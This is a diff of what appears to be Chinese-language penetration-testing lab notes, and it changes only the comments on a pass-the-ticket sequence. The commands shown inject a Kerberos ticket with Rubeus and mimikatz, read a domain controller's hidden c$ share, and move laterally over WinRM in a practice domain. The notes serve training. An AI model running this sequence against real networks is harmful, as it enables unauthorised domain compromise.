@@ -454,15 +454,15 @@ c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanef
 或
 PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))                          将 kirbi 内容转成Base64  
 c:\tools> Rubeus.exe ptt /ticket:Base64格式的票据
-c:\tools> dir \\DC01.inlanefreight.htb\c$      查看受保护目录
+c:\tools> dir \\DC01.inlanefreight.htb\c$      通过 SMB 查看受保护文件，末尾的 $ 表示这是一个隐藏共享
 或
 C:\tools> mimikatz.exe 
 mimikatz # privilege::debug
 mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"      传递票据
 mimikatz # exit
-c:\tools> dir \\DC01.inlanefreight.htb\c$      查看受保护目录
+c:\tools> dir \\DC01.inlanefreight.htb\c$      通过 SMB 查看受保护文件，末尾的 $ 表示这是一个隐藏共享
 c:\tools>powershell      启动 PS
-PS C:\tools> Enter-PSSession -ComputerName DC01      横向移动到 DC01
+PS C:\tools> Enter-PSSession -ComputerName DC01      通过 winRM 横向移动到 DC01，进行交互
 
 
 
